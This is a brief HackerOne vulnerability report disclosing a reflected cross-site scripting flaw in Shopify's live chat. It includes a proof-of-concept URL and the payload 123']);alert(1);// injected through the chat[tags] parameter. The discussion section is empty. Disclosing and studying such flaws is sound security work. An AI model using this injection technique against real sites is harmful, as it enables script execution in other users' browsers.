# HackerOne Report: Reflected XSS in chat
**Report ID:** 73566
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
https://livechat.shopify.com/customer/chats/new?chat%5Bemail%5D=mymail%40mail.com&chat%5Bname%5D=My+Name&utm_source=partner&chat%5Btags%5D=123%27%5D%29;alert%281%29;//&chat%5Bmetadata%5D%5Bshop_id%5D=90909090%22

Vulnerable param is **chat[tags]**. If fill it with **123']);alert(1);//** the XSS fill fire after click "Start chat@ button (screen).

## Discussion & Remediation Timeline
